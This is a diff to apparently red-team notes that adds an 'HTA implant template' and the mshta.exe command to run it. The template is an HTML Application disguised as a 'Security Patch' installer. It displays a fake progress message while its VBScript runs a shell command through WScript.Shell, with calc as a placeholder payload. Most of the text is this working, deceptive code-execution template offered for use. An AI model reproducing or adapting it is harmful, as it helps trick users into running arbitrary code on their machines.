@@ -1,5 +1,30 @@
 # HTA
 
+HTA implant template.
+
+```html
+<html>
+	<head>
+		<title>
+			Security Patch
+		</title>
+	</head>
+	<body>
+		<p>Installing security patch...</p>
+	</body>
+	<script language="VBScript">
+	Function Execute()
+		Set shell = CreateObject("wscript.Shell")
+		shell.run "calc"
+	End Function
+
+	Execute
+	</script>
+</html>
+```
+
+To execute the implant.
+
 ```
 C:\> mshta.exe %CD%\implant.hta
 
